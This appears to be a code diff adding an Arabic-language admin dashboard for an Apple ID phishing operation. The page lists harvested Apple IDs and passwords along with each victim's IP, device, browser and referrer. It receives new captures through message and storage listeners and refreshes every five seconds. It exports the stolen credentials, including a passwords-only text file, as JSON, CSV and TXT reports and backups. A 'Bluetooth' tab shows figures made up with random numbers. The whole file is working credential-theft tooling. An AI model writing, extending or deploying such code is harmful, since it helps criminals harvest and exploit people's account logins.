+                        </span>
+                    </td>
+                    <td>${browser}</td>
+                    <td>${screen}</td>
+                    <td>${language}</td>
+                    <td>${referrer}</td>
+                </tr>
+                `;
+            });
+            
+            tbody.innerHTML = html;
+        }
+        
+        // عرض بيانات الهواتف
+        function displayMobileData() {
+            const tbody = document.getElementById('mobileBody');
+            const emptyState = document.getElementById('emptyMobile');
+            
+            if (mobileData.length === 0) {
+                tbody.innerHTML = '';
+                emptyState.style.display = 'block';
+                return;
+            }
+            
+            emptyState.style.display = 'none';
+            
+            let html = '';
+            mobileData.forEach((data, index) => {
+                const time = new Date(data.timestamp || data.saved_at || data.time).toLocaleString('ar-SA');
+                const type = data.type || 'غير معروف';
+                const appleId = data.appleId || data.data?.appleId || 'غير معروف';
+                const password = data.password || data.data?.password || 'غير معروف';
+                const platform = data.platform || data.data?.platform || 'غير معروف';
+                const storageMethods = data.storage_method || data.method || 'غير معروف';
+                const status = data.success !== false ? '✅' : '❌';
+                
+                html += `
+                <tr>
+                    <td>${index + 1}</td>
+                    <td>${time}</td>
+                    <td>${type}</td>
+                    <td>${appleId}</td>
+                    <td class="password-cell">
+                        <span class="password-hidden">••••••••</span>
+                        <button class="toggle-password" onclick="toggleMobilePassword(${index})">
+                            👁️ عرض
+                        </button>
+                        <div class="password-visible" id="mobilePasswordView${index}">
+                            ${password}
+                        </div>
+                    </td>
+                    <td>${platform}</td>
+                    <td>${storageMethods}</td>
+                    <td>${status}</td>
+                </tr>
+                `;
+            });
+            
+            tbody.innerHTML = html;
+        }
+        
+        // الحصول على اسم المتصفح
+        function getBrowserName(userAgent) {
+            if (!userAgent) return 'غير معروف';
+            
+            const ua = userAgent.toLowerCase();
+            if (ua.includes('chrome')) return 'Chrome';
+            if (ua.includes('firefox')) return 'Firefox';
+            if (ua.includes('safari')) return 'Safari';
+            if (ua.includes('edge')) return 'Edge';
+            if (ua.includes('opera')) return 'Opera';
+            return 'متصفح آخر';
+        }
+        
+        // تبديل عرض كلمة المرور
+        function togglePassword(index) {
+            const view = document.getElementById(`passwordView${index}`);
+            const btn = event.target;
+            
+            if (view.style.display === 'block') {
+                view.style.display = 'none';
+                btn.textContent = '👁️ عرض';
+            } else {
+                view.style.display = 'block';
+                btn.textContent = '🙈 إخفاء';
+            }
+        }
+        
+        // تبديل عرض كلمة مرور الهواتف
+        function toggleMobilePassword(index) {
+            const view = document.getElementById(`mobilePasswordView${index}`);
+            const btn = event.target;
+            
+            if (view.style.display === 'block') {
+                view.style.display = 'none';
+                btn.textContent = '👁️ عرض';
+            } else {
+                view.style.display = 'block';
+                btn.textContent = '🙈 إخفاء';
+            }
+        }
+        
+        // حذف بيانات دخول
+        function deleteCredential(index) {
+            if (confirm('هل تريد حذف هذه البيانات؟')) {
+                allCredentials.splice(index, 1);
+                saveCredentials();
+                displayCredentials();
+                updateStats();
+                showNotification('تم حذف البيانات بنجاح', 'success');
+            }
+        }
+        
+        // حفظ بيانات الدخول
+        function saveCredentials() {
+            try {
+                localStorage.setItem('apple_credentials', JSON.stringify(allCredentials));
+            } catch (error) {
+                console.error('❌ خطأ في حفظ البيانات:', error);
+            }
+        }
+        
+        // تبديل التبويب
+        function switchTab(tabName) {
+            // إخفاء جميع التبويبات
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            document.querySelectorAll('.tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // إظهار التبويب المحدد
+            const tabId = `tab${tabName.charAt(0).toUpperCase() + tabName.slice(1)}`;
+            document.getElementById(tabId).classList.add('active');
+            
+            // تحديث التبويب النشط
+            document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`).classList.add('active');
+            
+            currentTab = tabName;
+            
+            // تحميل بيانات التبويب إذا لزم الأمر
+            if (tabName === 'mobile') {
+                loadMobileData();
+            } else if (tabName === 'bluetooth') {
+                loadBluetoothData();
+            }
+        }
+        
+        // فلترة بيانات الدخول
+        function filterCredentials(searchTerm) {
+            const rows = document.querySelectorAll('#credentialsBody tr');
+            const term = searchTerm.toLowerCase();
+            
+            rows.forEach(row => {
+                const text = row.textContent.toLowerCase();
+                row.style.display = text.includes(term) ? '' : 'none';
+            });
+        }
+        
+        // فلترة حسب نوع الجهاز
+        function filterByDevice(deviceType) {
+            const rows = document.querySelectorAll('#credentialsBody tr');
+            
+            rows.forEach(row => {
+                const deviceCell = row.cells[4];
+                if (!deviceCell) return;
+                
+                const deviceText = deviceCell.textContent.toLowerCase();
+                const isMobile = deviceText.includes('هاتف');
+                
+                if (!deviceType || 
+                    (deviceType === 'mobile' && isMobile) ||
+                    (deviceType === 'desktop' && !isMobile)) {
+                    row.style.display = '';
+                } else {
+                    row.style.display = 'none';
+                }
+            });
+        }
+        
+        // فلترة حسب التاريخ
+        function filterByDate(timeRange) {
+            const rows = document.querySelectorAll('#credentialsBody tr');
+            const now = new Date();
+            
+            rows.forEach(row => {
+                const timeCell = row.cells[1];
+                if (!timeCell) return;
+                
+                const timeText = timeCell.textContent;
+                const rowDate = parseArabicDate(timeText);
+                
+                let show = true;
+                
+                if (timeRange === 'today') {
+                    show = rowDate.toDateString() === now.toDateString();
+                } else if (timeRange === 'week') {
+                    const weekAgo = new Date(now - 7 * 24 * 60 * 60 * 1000);
+                    show = rowDate >= weekAgo;
+                } else if (timeRange === 'month') {
+                    const monthAgo = new Date(now);
+                    monthAgo.setMonth(monthAgo.getMonth() - 1);
+                    show = rowDate >= monthAgo;
+                }
+                
+                row.style.display = show ? '' : 'none';
+            });
+        }
+        
+        // تحويل التاريخ العربي
+        function parseArabicDate(dateString) {
+            try {
+                // إزالة النصوص العربية
+                const cleaned = dateString.replace(/[٠-٩]/g, d => '٠١٢٣٤٥٦٧٨٩'.indexOf(d))
+                                         .replace(/[۰-۹]/g, d => '۰۱۲۳۴۵۶۷۸۹'.indexOf(d));
+                return new Date(cleaned);
+            } catch {
+                return new Date();
+            }
+        }
+        
+        // فلترة الزيارات
+        function filterVisits(searchTerm) {
+            const rows = document.querySelectorAll('#visitsBody tr');
+            const term = searchTerm.toLowerCase();
+            
+            rows.forEach(row => {
+                const text = row.textContent.toLowerCase();
+                row.style.display = text.includes(term) ? '' : 'none';
+            });
+        }
+        
+        // فلترة بيانات الهواتف
+        function filterMobileData(searchTerm) {
+            const rows = document.querySelectorAll('#mobileBody tr');
+            const term = searchTerm.toLowerCase();
+            
+            rows.forEach(row => {
+                const text = row.textContent.toLowerCase();
+                row.style.display = text.includes(term) ? '' : 'none';
+            });
+        }
+        
+        // بدء التحديث التلقائي
+        function startAutoRefresh() {
+            if (refreshInterval) {
+                clearInterval(refreshInterval);
+            }
+            
+            refreshInterval = setInterval(() => {
+                if (currentTab === 'credentials' || currentTab === 'mobile') {
+                    loadCredentials();
+                    loadMobileData();
+                }
+                updateStats();
+                updateConnectionStatus();
+            }, 5000); // تحديث كل 5 ثواني
+        }
+        
+        // إعداد الاستماع للتحديثات المباشرة
+        function setupRealTimeListeners() {
+            // الاستماع للرسائل
+            window.addEventListener('message', function(event) {
+                if (event.data && event.data.type === 'mobile_update') {
+                    handleMobileUpdate(event.data);
+                }
+                
+                if (event.data && event.data.type === 'new_credential') {
+                    handleNewCredential(event.data);
+                }
+            });
+            
+            // الاستماع للتحديثات من localStorage
+            window.addEventListener('storage', function(event) {
+                if (event.key === 'mobile_dashboard_update') {
+                    try {
+                        const update = JSON.parse(event.newValue);
+                        handleMobileUpdate(update);
+                    } catch (e) {
+                        console.warn('⚠️ خطأ في معالجة تحديث localStorage');
+                    }
+                }
+                
+                if (event.key === 'dashboard_live_update') {
+                    try {
+                        const update = JSON.parse(event.newValue);
+                        handleNewCredential(update);
+                    } catch (e) {
+                        console.warn('⚠️ خطأ في معالجة تحديث مباشر');
+                    }
+                }
+            });
+            
+            // الاستماع للأحداث المخصصة
+            window.addEventListener('dashboardUpdate', function(event) {
+                if (event.detail && event.detail.type === 'new_credential') {
+                    handleNewCredential(event.detail);
+                }
+            });
+        }
+        
+        // معالجة تحديث الهواتف
+        function handleMobileUpdate(update) {
+            if (update.data) {
+                // إضافة البيانات الجديدة
+                allCredentials.unshift(update.data);
+                mobileData.unshift(update);
+                
+                // تحديث العرض
+                if (currentTab === 'credentials') {
+                    displayCredentials();
+                } else if (currentTab === 'mobile') {
+                    displayMobileData();
+                }
+                
+                // تحديث الإحصائيات
+                updateStats();
+                
+                // إظهار إشعار
+                showNotification(`تم استقبال بيانات جديدة من ${update.device === 'mobile' ? 'هاتف' : 'كمبيوتر'}`, 'success');
+            }
+        }
+        
+        // معالجة بيانات دخول جديدة
+        function handleNewCredential(data) {
+            if (data.data) {
+                // إضافة البيانات الجديدة
+                allCredentials.unshift(data.data);
+                
+                // تحديث العرض
+                if (currentTab === 'credentials') {
+                    displayCredentials();
+                }
+                
+                // تحديث الإحصائيات
+                updateStats();
+                
+                // إظهار إشعار
+                showNotification(`تم تسجيل بيانات دخول جديدة: ${data.data.appleId}`, 'success');
+            }
+        }
+        
+        // تحديث حالة الاتصال
+        function updateConnectionStatus() {
+            const statusElement = document.getElementById('connectionStatus');
+            if (statusElement) {
+                const isConnected = allCredentials.length > 0;
+                statusElement.textContent = isConnected ? 'متصلة' : 'جاري الاتصال...';
+                statusElement.style.color = isConnected ? 'white' : '#FF9500';
+            }
+        }
+        
+        // محاكاة بيانات البلوتوث
+        function simulateBluetoothData() {
+            setInterval(() => {
+                if (currentTab === 'bluetooth') {
+                    updateBluetoothStats();
+                    displayBluetoothData();
+                }
+            }, 3000);
+        }
+        
+        // تحديث إحصائيات البلوتوث
+        function updateBluetoothStats() {
+            document.getElementById('bluetoothConnections').textContent = bluetoothData.length;
+            document.getElementById('mobileDevices').textContent = 
+                bluetoothData.filter(d => d.device === 'mobile').length;
+            document.getElementById('bluetoothDataCount').textContent = bluetoothData.length;
+            document.getElementById('transferSpeed').textContent = 
+                Math.floor(Math.random() * 100) + 50;
+        }
+        
+        // عرض بيانات البلوتوث
+        function displayBluetoothData() {
+            const tbody = document.getElementById('bluetoothBody');
+            const emptyState = document.getElementById('emptyBluetooth');
+            
+            if (bluetoothData.length === 0) {
+                tbody.innerHTML = '';
+                emptyState.style.display = 'block';
+                return;
+            }
+            
+            emptyState.style.display = 'none';
+            
+            let html = '';
+            bluetoothData.slice(0, 20).forEach((data, index) => {
+                const time = new Date(data.timestamp).toLocaleString('ar-SA');
+                const deviceType = data.device === 'mobile' ? '📱 هاتف' : '💻 كمبيوتر';
+                const signalStrength = Math.floor(Math.random() * 100) + '%';
+                const dataSize = Math.floor(Math.random() * 1000) + 100 + ' ك.ب';
+                const dataType = data.type || 'غير معروف';
+                const status = '✅ ناجح';
+                
+                html += `
+                <tr>
+                    <td>${index + 1}</td>
+                    <td>${time}</td>
+                    <td>${deviceType}</td>
+                    <td>${signalStrength}</td>
+                    <td>${dataSize}</td>
+                    <td>${dataType}</td>
+                    <td>${status}</td>
+                </tr>
+                `;
+            });
+            
+            tbody.innerHTML = html;
+        }
+        
+        // إظهار إشعار
+        function showNotification(message, type = 'info') {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.background = type === 'error' ? 'var(--danger)' : 
+                                         type === 'warning' ? 'var(--warning)' : 
+                                         type === 'success' ? 'var(--success)' : 'var(--primary)';
+            notification.style.display = 'block';
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+        
+        // وظائف المساعدة
+        function refreshAllData() {
+            loadAllData();
+            showNotification('تم تحديث جميع البيانات', 'success');
+        }
+        
+        function refreshCredentials() {
+            loadCredentials();
+            showNotification('تم تحديث بيانات الدخول', 'success');
+        }
+        
+        function refreshMobileData() {
+            loadMobileData();
+            showNotification('تم تحديث بيانات الهواتف', 'success');
+        }
+        
+        function deleteAllCredentials() {
+            if (confirm('هل تريد حذف جميع بيانات الدخول؟ هذا الإجراء لا يمكن التراجع عنه.')) {
+                allCredentials = [];
+                mobileData = [];
+                localStorage.removeItem('apple_credentials');
+                localStorage.removeItem('mobile_credentials');
+                displayCredentials();
+                displayMobileData();
+                updateStats();
+                showNotification('تم حذف جميع البيانات', 'success');
+            }
+        }
+        
+        function simulateBluetooth() {
+            const mockData = {
+                type: 'bluetooth_transfer',
+                timestamp: new Date().toISOString(),
+                device: 'mobile',
+                data: {
+                    appleId: 'test@example.com',
+                    ip: '192.168.1.1',
+                    deviceType: 'mobile'
+                }
+            };
+            
+            bluetoothData.unshift(mockData);
+            updateBluetoothStats();
+            displayBluetoothData();
+            showNotification('تم محاكاة بيانات بلاعة جديدة', 'success');
+        }
+        
+        function clearBluetoothCache() {
+            if (confirm('هل تريد تنظيف ذاكرة البلوتوث؟')) {
+                bluetoothData = [];
+                localStorage.removeItem('bluetooth_data');
+                localStorage.removeItem('bluetooth_cache');
+                updateBluetoothStats();
+                displayBluetoothData();
+                showNotification('تم تنظيف ذاكرة البلوتوث', 'success');
+            }
+        }
+        
+        // تصدير البيانات
+        function exportFormat(format) {
+            const data = {
+                credentials: allCredentials,
+                visits: allVisits,
+                mobile: mobileData,
+                bluetooth: bluetoothData,
+                exportedAt: new Date().toISOString(),
+                total: allCredentials.length + allVisits.length + mobileData.length + bluetoothData.length
+            };
+            
+            let content, filename, mimeType;
+            
+            switch (format) {
+                case 'json':
+                    content = JSON.stringify(data, null, 2);
+                    filename = `apple_data_${Date.now()}.json`;
+                    mimeType = 'application/json';
+                    break;
+                    
+                case 'csv':
+                    content = convertToCSV(data);
+                    filename = `apple_data_${Date.now()}.csv`;
+                    mimeType = 'text/csv';
+                    break;
+                    
+                case 'txt':
+                    content = convertToTXT(data);
+                    filename = `apple_data_${Date.now()}.txt`;
+                    mimeType = 'text/plain';
+                    break;
+                    
+                default:
+                    showNotification('تنسيق غير معروف', 'error');
+                    return;
+            }
+            
+            downloadFile(content, filename, mimeType);
+            showNotification(`تم التصدير كـ ${format.toUpperCase()}`, 'success');
+        }
+        
+        // تحويل إلى CSV
+        function convertToCSV(data) {
+            let csv = 'Type,AppleID,Password,IP,Time,Device,Browser,Source\n';
+            
+            // بيانات الدخول
+            data.credentials.forEach(cred => {
+                const device = cred.deviceType === 'mobile' ? 'mobile' : 'desktop';
+                const browser = getBrowserName(cred.userAgent);
+                csv += `Credential,"${cred.appleId}","${cred.password}","${cred.ip}","${cred.timestamp}","${device}","${browser}","main"\n`;
+            });
+            
+            return csv;
+        }
+        
+        // تحويل إلى نص
+        function convertToTXT(data) {
+            let text = '='.repeat(80) + '\n';
+            text += 'تقرير بيانات Apple الكامل\n';
+            text += '='.repeat(80) + '\n\n';
+            
+            text += `• بيانات الدخول: ${data.credentials.length}\n`;
+            text += `• الزيارات: ${data.visits.length}\n`;
+            text += `• بيانات الهواتف: ${data.mobile.length}\n`;
+            text += `• بيانات البلوتوث: ${data.bluetooth.length}\n`;
+            text += `• الإجمالي: ${data.total}\n\n`;
+            
+            text += '🔐 بيانات الدخول:\n';
+            text += '─'.repeat(40) + '\n';
+            data.credentials.forEach((cred, index) => {
+                text += `\n${index + 1}. ${cred.appleId}\n`;
+                text += `   كلمة المرور: ${cred.password}\n`;
+                text += `   IP: ${cred.ip}\n`;
+                text += `   الوقت: ${new Date(cred.timestamp).toLocaleString('ar-SA')}\n`;
+                text += `   الجهاز: ${cred.deviceType === 'mobile' ? 'هاتف' : 'كمبيوتر'}\n`;
+            });
+            
+            text += '\n' + '='.repeat(80) + '\n';
+            text += `مُصدر في: ${new Date(data.exportedAt).toLocaleString('ar-SA')}\n`;
+            text += '='.repeat(80);
+            
+            return text;
+        }
+        
+        // تنزيل الملف
+        function downloadFile(content, filename, mimeType) {
+            try {
+                const blob = new Blob([content], { type: mimeType });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                setTimeout(() => {
+                    document.body.removeChild(a);
+                    URL.revokeObjectURL(url);
+                }, 100);
+                
+                return true;
+            } catch (error) {
+                console.error('❌ خطأ في تنزيل الملف:', error);
+                return false;
+            }
+        }
+        
+        // تصدير كلمات المرور فقط
+        function exportCredentialsOnly() {
+            if (allCredentials.length === 0) {
+                showNotification('لا توجد بيانات دخول للتصدير', 'warning');
+                return;
+            }
+            
+            let text = '🔐 كلمات مرور Apple\n';
+            text += '='.repeat(50) + '\n\n';
+            
+            allCredentials.forEach((cred, index) => {
+                text += `${index + 1}. ${cred.appleId}\n`;
+                text += `   كلمة المرور: ${cred.password}\n`;
+                text += `   الوقت: ${new Date(cred.timestamp).toLocaleString('ar-SA')}\n`;
+                text += `   IP: ${cred.ip}\n`;
+                text += `   الجهاز: ${cred.deviceType === 'mobile' ? 'هاتف' : 'كمبيوتر'}\n`;
+                text += '   ' + '-'.repeat(30) + '\n\n';
+            });
+            
+            downloadFile(text, `apple_passwords_${Date.now()}.txt`, 'text/plain');
+            showNotification('تم تصدير كلمات المرور', 'success');
+        }
+        
+        // تصدير جميع التنسيقات
+        function exportAllFormats() {
+            exportFormat('json');
+            setTimeout(() => exportFormat('csv'), 500);
+            setTimeout(() => exportFormat('txt'), 1000);
+            setTimeout(() => showNotification('تم تصدير جميع التنسيقات', 'success'), 1500);
+        }
+        
+        // إنشاء نسخة احتياطية
+        function createBackup() {
+            const backup = {
+                credentials: allCredentials,
+                visits: allVisits,
+                mobile: mobileData,
+                bluetooth: bluetoothData,
+                backupTime: new Date().toISOString(),
+                version: '3.0.0'
+            };
+            
+            const content = JSON.stringify(backup, null, 2);
+            downloadFile(content, `apple_backup_${Date.now()}.json`, 'application/json');
+            showNotification('تم إنشاء نسخة احتياطية كاملة', 'success');
+        }
+    </script>
+</body>
+</html>
